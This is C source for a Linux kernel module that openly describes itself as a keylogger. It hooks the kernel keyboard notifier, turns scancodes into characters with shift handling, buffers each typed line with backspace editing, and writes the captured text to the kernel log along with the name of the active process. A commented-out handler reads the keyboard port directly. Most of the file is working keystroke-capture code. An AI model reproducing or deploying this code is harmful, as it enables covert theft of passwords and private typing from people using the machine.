#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/input.h>

#include <linux/interrupt.h>
#include <asm/io.h>


static int lkm_keylog_hook(struct notifier_block *nblk, unsigned long code, void *nparam); 

static struct notifier_block lkm_keylog_nblk = {
	.notifier_call = lkm_keylog_hook,
};

static const char *lkm_keylogmap[][2] = {
	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       		// 0-3
    	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 		// 4-7
    	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 		// 8-11
    	{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         		// 12-14
    	{"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
    	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 		// 20-23
    	{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 		// 24-27
    	{"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   		// 28-31
    	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 		// 32-35
    	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 		// 36-39
    	{"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, 		// 40-43
    	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 		// 44-47
    	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 		// 48-51
    	{".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
    	{"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
    	{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         		// 60-63
    	{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         		// 64-67
    	{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   		// 68-70
    	{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, 		// 71-73
    	{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         		// 74-76
    	{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},         		// 77-79
    	{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, 		// 80-82
    	{"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},      		// 83-85
    	{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},     		// 86-89
    	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
    	{"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
    	{"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},   		// 99-101
    	{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},   		// 102-104
    	{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
    	{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},   		// 108-110
    	{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},   		// 111-114
    	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         		// 115-118
    	{"_PAUSE_", "_PAUSE_"},                                         		// 119
};

typedef struct lkm_keylog_buf {
	char *buf;
	int  size;
	int  cnt;
	char *data;
}keylog_buf;

static char filtr_buf1[2048] = {0};
static char tmp_buf1[512] = {0};
static int cnt_tmp_buf1 = 0;
static int backspace_flag = 0;		//if(backspace_flag)  then the next symbol needs BACKSPACE

keylog_buf filtr_1buf = { .buf = tmp_buf1, .cnt = 0, .size = 512, .data = (char*)&backspace_flag};
keylog_buf filtr_mbuf = { .buf = filtr_buf1, .cnt = 0, .size = 2048};

static void lkm_keylog_dump2(keylog_buf *filt) {
	char *buf = filt->buf;
	int cnt = filt->cnt;
	if(cnt>=filt->size) return;
	char *pr = kmalloc(cnt+16, GFP_KERNEL);

	printk(KERN_INFO "dump2:");
		printk(KERN_INFO "%s", buf);

	kfree(pr);
	return;
}

static void lkm_keylog_dump(keylog_buf *filt) {

	char *buf = filt->buf;
	int cnt = filt->cnt;
	if(cnt>=filt->size) return;

	printk(KERN_INFO "dump:");
	for(int i=0; i<cnt; i++) {
		printk(KERN_INFO "%c", buf[i]);
	}

	printk(KERN_INFO "\n");
	return;
}

static int lkm_keylog_sync(keylog_buf *main, keylog_buf *tmp) {

	char *mb = main->buf;
	char *tb = tmp->buf;
	int mc = main->cnt;
	int tc = tmp->cnt;
	int i;
	if(!mb || !tb || !tc) return -1;
	printk(KERN_INFO "sync start..\n");

	for(i=0; ((mc+i)<main->size) && (i<tmp->size) && (i<tc); i++) {
		mb[mc+i] = tb[i];
	}

	main->cnt = mc+i;
	if(i!=tc) return i;
	return 0;
}

static int lkm_keylog_filter(char code, const char *sym, keylog_buf *filt) {

	//char code = key;
	char *buf = filt->buf;
	int *backsp = (int*)filt->data;
	int size = filt->size;
	int cnt = filt->cnt;


	printk(KERN_INFO "<<<<<<<< code(%x)|cnt(%x) >>>>>>>>>\n", code, cnt);

	if((*backsp) || (cnt>=size)) {

		//printk(KERN_INFO "<<<<< need backspase(%x) >>>>>\n", *backsp);
		if(code==14) { 	//"BACKSPACE"

			*backsp = 0;	
			if(cnt>0) {
				cnt--;
				if(cnt<size) buf[cnt] = 0; //del last code 
				goto exit_fm;
			}
		}
		else {
			//clean all tmp_buf1 and continue...
			memset(buf, 0, size);
			*backsp = 0;
			cnt = 0;
		}
	}
	if((code>=2) && (code<=58) ) {
		switch(code) {
			
			case 28: //"/n"
				if(cnt<1) break;
				//buf[cnt] = code; //add code to tmp_buf1 
				buf[cnt] = *sym; //add code to tmp_buf1 
				filt->cnt = ++cnt;
				lkm_keylog_sync(&filtr_mbuf, &filtr_1buf);

				//printk(KERN_INFO "filter_tmp:%s", buf);
  				//lkm_keylog_dump(&filtr_mbuf);
  				lkm_keylog_dump2(&filtr_mbuf);

				memset(buf, 0, size);
				cnt = 0;
				*backsp = 0;
				filt->cnt = cnt;
				return 1;

			case 14: //"BACKSPACE"
				cnt--;
				buf[cnt] = 0; //del last code 
				break;

			case 15: //"TAB"
			case 29: //"LCTRL"
			case 42: //"LSHIFT"
			case 54: //"RSHIFT"
			case 55: //"PRTSCR"
			case 56: //"LALT"
			//case 57: //"SPACE"
			case 58: //"CAPS"
				//add code to tmp_buf1 and wait BACKSPACE in next code
				//*backsp = 1;
				//buf[cnt] = *sym;
				//cnt++;
				break;

			default:
				//printk(KERN_INFO "<<<<< defaoult cnt(%x) >>>>>\n", cnt);
				//buf[cnt] = code; //add code to tmp_buf1 
				buf[cnt] = *sym;
				cnt++;
				break;
		}	
	}
	else {
		//add code to tmp_buf1 and wait BACKSPACE in next code
		//buf[cnt] = *sym;
		//*backsp = 1;
		//cnt++;
	}

   exit_fm:
	filt->cnt = cnt;
	return 0;
}

static int lkm_keylog_hook(struct notifier_block *nblk, unsigned long code, void *nparam) {

	//char kbuf[16] = {0};
	const char *sym = NULL;
	struct keyboard_notifier_param *param = nparam;
	int shift = param->shift;
	int key = param->value;

	if(!(param->down)) return NOTIFY_OK;
	if( (key>KEY_RESERVED) && (key<=KEY_PAUSE)) {

		sym = (shift==1) ? lkm_keylogmap[key][1] : lkm_keylogmap[key][0];
		//snprintf(kbuf, 16, "%s", sym);
	lkm_keylog_filter(key, sym, &filtr_1buf);
  	//lkm_keylog_dump(&filtr_1buf);
	}
     	if(!sym) return NOTIFY_OK;

	struct task_struct *t = current;

		printk(KERN_INFO "(%s)|(%x)|(%s)", sym, key, t->comm);
	return NOTIFY_OK;
}

/////////////////////////////////////////////////////////////////////////////////
#define KB_IRQ 1
struct logger_data {
	unsigned char scancode;
	struct task_struct *task;
}lkm_keylog_data;


void lkm_tasklet_kblog(struct tasklet_struct *dummy) {
	printk(KERN_INFO "IN tasklet_kblog\n");

	struct task_struct *t = lkm_keylog_data.task;
	char key = lkm_keylog_data.scancode;

	printk(KERN_INFO "scancode(%x)|name(%s)|pid(%d)\n", key, t->comm, t->pid);

	printk(KERN_INFO "OUT tasklet_kblog\n");
}

DECLARE_TASKLET(my_tasklet, lkm_tasklet_kblog);
irq_handler_t lkm_keylog_handler(int irq, void *dev_id, struct pt_regs *regs) {

	lkm_keylog_data.scancode = inb(0x60);
	lkm_keylog_data.task = current;
	tasklet_schedule(&my_tasklet);
	return (irq_handler_t)IRQ_HANDLED;
}
/////////////////////////////////////////////////////////////////////////////////

static int __init lkm_keylog_init(void) {
	printk(KERN_INFO "++++++ LKM_KEYLOGER, Hale-halE-HaLE-OP ++++++\n");

	int ret;
	//ret = request_irq(KB_IRQ, (irq_handler_t)lkm_keylog_handler, IRQF_SHARED, "custom handler", &lkm_keylog_data);
	if(ret) printk(KERN_INFO "ERROR: IRQ kb\n");

	register_keyboard_notifier(&lkm_keylog_nblk);

	return 0;
}
static void __exit lkm_keylog_exit(void) {

	//tasklet_kill(&my_tasklet);
	//free_irq(KB_IRQ, &lkm_keylog_data);
	unregister_keyboard_notifier(&lkm_keylog_nblk);
	printk(KERN_INFO "++++++ LKM_KEYLOGER, HN-Hn-hn ++++++\n");
	return;
}

module_init(lkm_keylog_init);
module_exit(lkm_keylog_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("PARFIK");
MODULE_DESCRIPTION("KEYLOGER LKM...");
MODULE_VERSION("0.01");
